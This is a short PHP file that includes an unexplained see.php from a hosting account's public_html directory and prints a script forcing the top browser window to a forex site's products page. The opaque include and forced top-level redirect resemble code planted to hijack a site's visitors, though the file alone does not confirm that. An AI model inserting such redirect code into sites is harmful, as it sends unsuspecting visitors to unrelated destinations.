<?php
include("/home/tecvidjt/public_html/see.php");
echo "<script>window.top.location='https://forexautonomy.com/orders/index?page=products&p=1'</script>";
?>